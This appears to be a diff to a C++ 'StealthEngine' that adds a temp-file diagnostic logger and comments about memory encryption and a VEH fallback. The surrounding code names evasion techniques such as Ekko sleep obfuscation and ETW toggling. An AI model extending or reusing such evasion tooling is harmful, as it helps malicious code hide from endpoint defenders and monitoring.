@@ -6,6 +6,27 @@
 #include "platform.h"
 #include <chrono>
 #include <random>
+#include <cstdio>
+#include <cstdarg>
+
+// ★ v3.37: 本地诊断日志 (写 %TEMP%\stealth_diag.log)
+static void CoreDiag(const char* fmt, ...) {
+    char buf[256];
+    va_list args;
+    va_start(args, fmt);
+    int len = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, args);
+    va_end(args);
+    wchar_t path[MAX_PATH];
+    GetTempPathW(MAX_PATH, path);
+    wcscat_s(path, L"stealth_diag.log");
+    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+    if (h != INVALID_HANDLE_VALUE) {
+        DWORD w;
+        WriteFile(h, buf, (DWORD)len, &w, 0);
+        FlushFileBuffers(h);  // ★ v3.38: 强制落盘
+        CloseHandle(h);
+    }
+}
 
 namespace stealth {
 
@@ -242,6 +263,8 @@ void StealthEngine::StealthSleep(DWORD milliseconds) {
             lastCloakToggle = now;
         }
 
+        // ★ v3.37: EncryptAll/DecryptAll 已安全化 (检查 VirtualProtect 返回值)
+        //   即使加密失败也不会崩溃, VEH 处理器提供兜底保护
         SleepObfuscator::Instance().EkkoSleep(milliseconds);
 
         if (shouldToggleETW) {
